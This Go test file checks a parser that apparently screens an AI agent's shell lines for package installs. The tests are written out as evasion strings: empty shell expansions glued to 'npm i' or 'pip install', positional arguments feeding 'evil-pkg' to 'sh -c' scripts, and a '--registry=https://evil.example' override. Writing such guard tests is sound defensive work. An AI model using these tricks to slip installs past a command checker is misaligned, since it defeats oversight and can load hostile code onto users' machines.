package installread

import (
	"slices"
	"testing"
)

// READER-ESCAPE-1 round 2, R4: an empty-by-default expansion glued to the subcommand (the shell runs npm i …). The
// base and both heads read these silent; now the word's literal remainder is the subcommand, so the line is held.
func TestReaderEscapeEmptyExpansion(t *testing.T) {
	hold := func(line string) bool {
		tg, un, _, s := ParseLine(line)
		return len(tg)+len(un)+len(HookExtra(line, tg, un, s)) > 0
	}
	for _, line := range []string{
		`npm $@i mcp-server-fetch`, `npm ${9}i mcp-server-fetch`, `npm "$@"i mcp-server-fetch`,
		`pip $*install requests`, `npm ${ZZ_UNSET-}install mcp-server-fetch`, `npm $@\i mcp-server-fetch`,
		`uv pip $@install requests`,
	} {
		if !hold(line) {
			t.Errorf("%q: read clean, the shell runs an install", line)
		}
	}
	// a $env: / $HOME Windows path still resolves (the $ branch of windowsPathStart is not broken by R4)
	if tg, _, _, _ := ParseLine(`$HOME\bin\pip.exe install requests`); len(tg) == 0 {
		t.Error(`$HOME\bin\pip.exe lost its install`)
	}
}

// A quoted word with a blank in it keeps its expansions: the shell does not split it, and the script of sh -c '… $1'
// is the inner shell's, read again with its own words (where $1 is empty and goes).
func TestReaderEscapeEmptyExpansionQuotedWord(t *testing.T) {
	const line = `sh -c 'npx -y ok-pkg $1' arg`
	cs := Commands(line)
	if len(cs) < 2 || len(cs[0].Words) < 3 || cs[0].Words[2] != "npx -y ok-pkg $1" {
		t.Fatalf("%q: the outer command's script word is %+v, want it whole", line, cs)
	}
	if tg, _, _, _ := ParseLine(line); len(tg) != 1 || tg[0] != "npm:ok-pkg" {
		t.Errorf("%q: targets %q, want npm:ok-pkg", line, tg)
	}
}

// $1 and $@ are empty at the top of the agent's line, but not in a script given to sh -c with arguments, after set --
// or in a function: there they are the arguments. The words as written are read too, and a positional parameter in an
// install's argument holds the line as it did before round 2 — never a package named by $0 instead, and never silence.
func TestReaderEscapeEmptyExpansionPositionalBound(t *testing.T) {
	for _, line := range []string{
		`sh -c 'npx -y $1' x evil-pkg`,
		`sh -c 'npx -y "$1"' x evil-pkg`,
		`sh -c 'npm i $1' evil-pkg`,
		`sh -c 'npm i "$@"' x evil-pkg`,
		`bash -c 'npm $1 evil-pkg' x i`,
		`set -- evil-pkg; npx -y $1`,
		`f() { npx -y "$1"; }; f evil-pkg`,
		`X=evil-pkg; npx -y ${X-}`,
		`xargs sh -c 'npx -y $1' x < pkgs.txt`,
	} {
		if _, un, _, _ := ParseLine(line); len(un) == 0 {
			t.Errorf("%q: no hold; the shell installs what $1 is", line)
		}
	}
}

// A lone empty-by-default expansion makes no word: npm $@ i x is npm i x to the shell, and the package is a target
// (checked, denied when known bad), not only a hold.
func TestReaderEscapeEmptyExpansionLoneWord(t *testing.T) {
	for _, line := range []string{`npm $@ i evil-pkg`, `"$@" npx -y evil-pkg`, `npx -y $* evil-pkg`, `npx ${9} -y evil-pkg`} {
		if tg, _, _, _ := ParseLine(line); !slices.Contains(tg, "npm:evil-pkg") {
			t.Errorf("%q: targets %q, want npm:evil-pkg", line, tg)
		}
	}
}

// In a script given arguments, $1 is the caller's argument, not empty (review of round 2, N2): npm $1i x is held as a
// word the line does not show (variable_argument), not only read as npm i x. This is the hold that kills mutant M35.
func TestReaderEscapeEmptyExpansionScriptArgument(t *testing.T) {
	for _, line := range []string{
		`sh -c 'npm $1i mcp-server-fetch' _ ''`,
		`bash -c 'npm ${1}i mcp-server-fetch' _ ''`,
		`sh -c 'pip $1install requests' _ ''`,
		`sh -c 'npm $1i mcp-server-fetch' _ '--registry=https://evil.example '`,
	} {
		_, un, _, _ := ParseLine(line)
		if !slices.ContainsFunc(un, func(u string) bool { return UnreadCode(u) == "variable_argument" }) {
			t.Errorf("%q: unread %q, want a variable_argument hold", line, un)
		}
	}
}
